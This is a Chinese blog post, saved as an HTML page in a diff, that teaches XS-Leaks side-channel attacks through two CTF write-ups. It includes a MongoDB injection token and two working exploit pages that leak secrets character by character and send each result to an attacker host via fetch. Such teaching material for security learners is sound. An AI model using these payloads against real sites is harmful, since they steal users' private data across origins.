@@ -1,0 +1,402 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>前端安全大师养成计划Vol.01:XS-Leaks - Welcome to fallingblog</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="关键词： 侧信道；跨域；泄漏信息
+前言从CSRF到同源...">
+  <meta name="author" content="Ibukifalling">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: true,
+        alipay: '/images/myimg/alipay.jpg',
+        wechat: '/images/myimg/wechat.png'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">前端安全大师养成计划Vol.01:XS-Leaks</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">前端安全大师养成计划Vol.01:XS-Leaks</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 29, 2023</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>6423</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <p>关键词： 侧信道；跨域；泄漏信息</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="从CSRF到同源策略"><a href="#从CSRF到同源策略" class="headerlink" title="从CSRF到同源策略"></a>从CSRF到同源策略</h2><p>众所周知，浏览器依靠js搭建起用户与服务端之间的桥梁，我们在网页时，点击不同的功能按钮，js自动向服务端发起各种不同的请求，构成了我们日常网上冲浪的舒适体验<br><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak1.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>当然，恶意的攻击者也可以依靠js来伪造用户交互，实现CSRF攻击，一个经典的CSRF例子如下图所示<br><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>出于安全性的考虑，现代浏览器基本都实现了同源策略，限制不同网站之间的数据读取</p>
+<p>举个栗子🌰，我们可以在b站主页通过控制台打开一个新的b站视频窗口，并且可以取得这个窗口的document等信息</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> MyWindow = <span class="hljs-built_in">window</span>.open(<span class="hljs-string">&#x27;https://www.bilibili.com/video/BV1Mc411u7xh/&#x27;</span>)<br><br>MyWindow.document.title<br><span class="hljs-comment">//显示对应的标签页title</span><br></code></pre></td></tr></table></figure>
+
+<p>但当我们在百度的主页进行一样的操作时，却会Permission denied，这是因为百度和b站并不同源，同源策略限制了不同网站之间的数据读取</p>
+<p><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak3.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>同源策略的限制，让攻击者无法轻易地通过js脚本跨站获得信息，保护了用户浏览网页时的安全性和隐私性，是浏览器安全的基石(&lt;-这一段是gpt说的)</p>
+<h1 id="XS-Leaks简介"><a href="#XS-Leaks简介" class="headerlink" title="XS-Leaks简介"></a>XS-Leaks简介</h1><p>XS-Leaks，即cross-site leaks，直译为跨站泄漏，是一类基于浏览器特性的侧信道攻击<br>说到侧信道攻击，大家应该或多或少都听过这个词，也听过侧信道攻击的通俗解释-“你妈回家看到你在写作业，很高兴，结果摸电视发现是热的，把你打了一顿”。从广义上说，侧信道攻击的本质是增加获取信息的维度，从一些容易被忽视的地方泄漏出关键信息<br>下面介绍XS-Leaks中一种比较经典的攻击手法，XS-Search，让大家对XS-Leaks有一个基本概念</p>
+<h2 id="XS-Search"><a href="#XS-Search" class="headerlink" title="XS-Search"></a>XS-Search</h2><p>设想网站有一个模糊查找功能，可以通过一个get参数对数据进行查询，那么虽然攻击者由于同源策略的限制无法直接取得查询结果，但是却可以通过请求各自所花费的时间来判断搜索是否返回了结果（很自然的想法，查询到结果的请求会比没查询到结果的请求响应时间更长），由此泄漏出数据中是否包含某些具体内容</p>
+<blockquote>
+<p>小靳同学喜欢把银行卡密码写在某在线笔记里，小茯同学知道后写了一个钓鱼🎣网站发给小靳，通过笔记的搜索功能进行XS-Search，一位一位地leak出小靳同学的银行卡密码，发现是自己的生日。</p>
+</blockquote>
+<p>上述案例就属于XS-Search的典型应用</p>
+<p><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak4.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>不过这样的攻击方式有很明显的缺点：利用条件苛刻<br>● 每个请求能泄漏的信息很有限，想要获得具体的信息要发出大量请求<br>● 对响应时间的影响因素太多太不稳定，比如网络抖动和网络延迟（虽然有timeless timing等技巧可以减少影响，但依然无法改变利用条件苛刻的事实）</p>
+<p>话虽如此，XS-Search却为我们打开了一种攻击思路，并且XS-Leaks的实际攻击手段也远不止如此</p>
+<h2 id="一些CTF题目"><a href="#一些CTF题目" class="headerlink" title="一些CTF题目"></a>一些CTF题目</h2><h3 id="2021祥云杯-Package-Manager-2021"><a href="#2021祥云杯-Package-Manager-2021" class="headerlink" title="[2021祥云杯]Package Manager 2021"></a>[2021祥云杯]Package Manager 2021</h3><p>buuoj上有在线环境</p>
+<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[2021%E7%A5%A5%E4%BA%91%E6%9D%AF]Package%20Manager%202021">https://buuoj.cn/challenges#[2021%E7%A5%A5%E4%BA%91%E6%9D%AF]Package%20Manager%202021</a><br>这个题的常规解法是mongoDB注入，不过还有一个画蛇添足的xsleak做法（为什么说是画蛇添足呢，因为用xsleak做也还是需要注入），这里介绍一下xsleak部分的思路<br>题目是一个package管理页，可以自己添加package，flag是admin用户的一个package内容<br><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak5.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>题目里有一个search功能<br>/packages/list?search=alibaba </p>
+<p><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak6.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>/packages/list?search=40thieves</p>
+<p><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak7.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>注意到搜索成功和失败时返回的状态码不同（200和404），可以以此作为侧信道进行leak<br>解题<br>首先需要提交一个校验token才能向admin发送url，校验时从mongoDB查询，查询语句如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> docs = <span class="hljs-keyword">await</span> User.$where(<span class="hljs-string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="hljs-subst">$&#123;token.toString()&#125;</span>&quot;`</span>).exec()<br></code></pre></td></tr></table></figure>
+
+<p>其中token是我们可控的，虽然有正则匹配token必须是md5格式，但是因为没有写^$所以可以直接塞32个a进行绕过（注入的做法就是在这里直接注出密码，但是我们还要打xsleak，就先放密码一马）<br>输入如下token，构造永真式通过校验<br><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;||this.username==&quot;admin</code></p>
+<blockquote>
+<p>题外话，这里如果改成 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa”||”a”==”a 是无法通过校验的，why？</p>
+</blockquote>
+<p>然后我们就可以自己创建一个package发送给admin了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">res.set(<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>, <span class="hljs-string">&quot;default-src &#x27;none&#x27;;style-src &#x27;self&#x27; &#x27;sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=&#x27;;img-src &#x27;self&#x27;;form-action &#x27;self&#x27;;base-uri &#x27;none&#x27;;&quot;</span>);<br>res.set(<span class="hljs-string">&#x27;X-Content-Type-Options&#x27;</span>,<span class="hljs-string">&#x27;nosniff&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>因为题目CSP做了非常严格的限制，常规的xss基本上全都打不通，能使用的基本上只有一个meta标签重定向，只能考虑xsleak<br>在火狐环境下，可以使用object元素的onload和onerror事件进行leak，如果object.data的访问状态码为200，则会触发onload，如果访问状态码为404，则会触发onerror</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs htmlmixed">&lt;html&gt;<br>  &lt;script&gt;<br>    const VPS_IP = &#x27;http://111.111.111.111/&#x27;<br>    const chars = &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;;<br><br>    const escape = (c) =&gt; &#123;<br>      return c.replace(/[.*+?^=!:$&#123;&#125;()|[\]\/\\]/g, &#x27;\\$&amp;&#x27;);<br>    &#125;<br><br>    const oracle = async (url) =&gt; &#123;<br>      return new Promise((resolve, reject) =&gt; &#123;<br>        const object = document.createElement(&quot;object&quot;);<br>        object.data = url;<br>        object.onload = resolve;<br>        object.onerror = reject;  <br>        document.head.appendChild(object);<br>      &#125;);<br>    &#125;<br>    const search = async (url) =&gt; &#123;<br>      try &#123;<br>        await oracle(url)<br>        return true;<br>      &#125; catch (e) &#123;<br>        return false;<br>      &#125;<br>    &#125;<br><br>      (async () =&gt; &#123;<br>        let flag = &#x27;&#x27;;<br>        let url = `http://localhost:8888/packages/list?search[description][$regex]=^$&#123;flag&#125;`<br>        while (flag.charAt(flag.length - 1) !== &quot;&#125;&quot;) &#123;<br>          for ( let i of chars ) &#123;<br>            if ( await(search(url + escape(i))) ) &#123;<br>              url = url + escape(i)<br>              flag += i<br>              await fetch(`$&#123;VPS_IP&#125;/?flag=$&#123;flag&#125;`, &#123;mode: &#x27;no-cors&#x27;&#125;)<br>              break;<br>            &#125;   else &#123;<br>              console.log(&#x27;failed&#x27;);<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;)();<br>  &lt;/script&gt;<br>  &lt;img src=&quot;https://deelay.me/10000/http://example.com&quot;/&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak8.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h3 id="SUSCTF-2022-ez-notes"><a href="#SUSCTF-2022-ez-notes" class="headerlink" title="[SUSCTF 2022] ez_notes"></a>[SUSCTF 2022] ez_notes</h3><p>和上面一题大同小异，可以创建notes，notes有搜索功能，可以给admin发送url，flag是admin的一个note</p>
+<p>搜索功能在搜索到唯一结果时会进行一次跳转，可以以此为侧信道进行leak</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (data.length === <span class="hljs-number">1</span>)  <span class="hljs-comment">// 仅有一条结果</span><br>&#123;<br>  <span class="hljs-keyword">let</span> url = <span class="hljs-string">&#x27;/view/&#x27;</span> + data[<span class="hljs-number">0</span>].id<br>  res.send(<span class="hljs-string">&#x27;find only match, redirecting&lt;script&gt;setTimeout(function()&#123;location.href=&quot;&#x27;</span> + url + <span class="hljs-string">&#x27;&quot;&#125;,1000) &lt;/script&gt;&#x27;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>具体的leak方法是：js打开的窗口会存有一个history属性，虽然在不同源时无法查看，但是可以将窗口切回同源页面后通过history的长度判断是否进行了跳转，跳转过的window会有更长的history</p>
+<p>exp</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">exp()</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exp</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">      <span class="hljs-keyword">let</span> charset = <span class="hljs-string">&quot;1234567890_qwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="javascript">      <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> c <span class="hljs-keyword">of</span> charset)&#123;</span><br><span class="javascript">        test(c)</span><br><span class="javascript">      &#125;</span><br><span class="javascript">    &#125;</span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params">c</span>) </span>&#123;</span><br><span class="javascript">      <span class="hljs-keyword">let</span> win = open(<span class="hljs-string">&quot;http://120.53.107.60:3456/search?q=flag&#123;&quot;</span>+ c )</span><br><span class="javascript">  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;win.location=<span class="hljs-string">&quot;http://ip&quot;</span>&#125;, <span class="hljs-number">2000</span>)</span><br><span class="javascript">  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;</span><br><span class="javascript">    <span class="hljs-built_in">console</span>.log(c)</span><br><span class="javascript">    <span class="hljs-built_in">console</span>.log(win.history.length)</span><br><span class="javascript">    <span class="hljs-keyword">if</span>(win.history.length === <span class="hljs-number">3</span>)</span><br><span class="javascript">    &#123;</span><br><span class="javascript">      fetch(<span class="hljs-string">&quot;http://ip/?&quot;</span> + c)</span><br><span class="javascript">    &#125;</span><br><span class="javascript">  &#125;, <span class="hljs-number">4000</span>)</span><br><span class="javascript">  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;</span><br><span class="javascript">    win.close()</span><br><span class="javascript">  &#125;, <span class="hljs-number">5000</span>)</span><br><span class="javascript">&#125;</span><br><span class="javascript"></span><br><span class="javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="其他leak手法"><a href="#其他leak手法" class="headerlink" title="其他leak手法"></a>其他leak手法</h2><p>XS-Leaks的攻击手法是不断迭代的，并且受浏览器环境影响很大<br><a target="_blank" rel="noopener" href="https://xsinator.com/paper.pdf">https://xsinator.com/paper.pdf</a> 这篇paper比较全面地介绍了各种攻击技巧，并测试了不同浏览器环境下的攻击可行性，有兴趣的话可以研读一下</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总体来说，XS-Leaks的危害还是不太大的：攻击条件苛刻，攻击能否成功依赖被攻击者环境，泄漏的信息有限……但不排除在一些特殊情境下，还是会产生比较高的风险，譬如leak出帐密AK等敏感信息<br>并且由于XS-Leaks基于浏览器，对于开发者来说，XS-Leaks其实很难防范。再加上XS-Leaks作为一种比较新的攻击手法，也并不被大家所熟知，就导致产生了很多潜在的XS-Leaks攻击面</p>
+<p>有专家预言XS-Leaks会在未来成为OWASP TOP10，我个人预言一下这个专家的预言不会成真（笑）。<br>目前来看，XS-Leaks本身还是无法独立成为比较严重的安全问题，更多是作为一种trick作研究和娱乐用。（以及国外的CTF很喜欢出XS-Leaks的题）</p>
+<p>下集预告：如何手撕前端js混淆（应该是没有下集了）</p>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://xsleaks.dev/">https://xsleaks.dev/</a>      XS-Leaks Wiki，非常全面<br><a target="_blank" rel="noopener" href="https://xsinator.com/">https://xsinator.com/</a>    查询不同浏览器环境可用的leak手法，还可以一键测试当前浏览器<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11306">https://xz.aliyun.com/t/11306</a><br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xs-search">https://book.hacktricks.xyz/pentesting-web/xs-search</a><br><a target="_blank" rel="noopener" href="https://secweb.work/papers/2021/vangoethem2021leaks.pdf">https://secweb.work/papers/2021/vangoethem2021leaks.pdf</a><br><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html</a><br><a target="_blank" rel="noopener" href="https://owasp.org/www-chapter-germany/stammtische/hamburg/assets/slides/2022-02-24_XS-Leak%20und%20XS-Search-Angriffe.pdf">https://owasp.org/www-chapter-germany/stammtische/hamburg/assets/slides/2022-02-24_XS-Leak%20und%20XS-Search-Angriffe.pdf</a></p>
+
+      </section>
+      <section class="extra">
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="/images/myimg/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2099/01/10/my2021/"><i class="iconfont iconleft"></i>2021年度划水报告</a>
+    <a href="/2023/06/07/Android-app-packet-capture/">安卓应用防抓包机制及一些绕过<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8ECSRF%E5%88%B0%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-text">从CSRF到同源策略</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XS-Leaks%E7%AE%80%E4%BB%8B"><span class="toc-text">XS-Leaks简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XS-Search"><span class="toc-text">XS-Search</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9BCTF%E9%A2%98%E7%9B%AE"><span class="toc-text">一些CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2021%E7%A5%A5%E4%BA%91%E6%9D%AF-Package-Manager-2021"><span class="toc-text">[2021祥云杯]Package Manager 2021</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUSCTF-2022-ez-notes"><span class="toc-text">[SUSCTF 2022] ez_notes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96leak%E6%89%8B%E6%B3%95"><span class="toc-text">其他leak手法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=3067733270 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="mailto:3067733270@qq.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
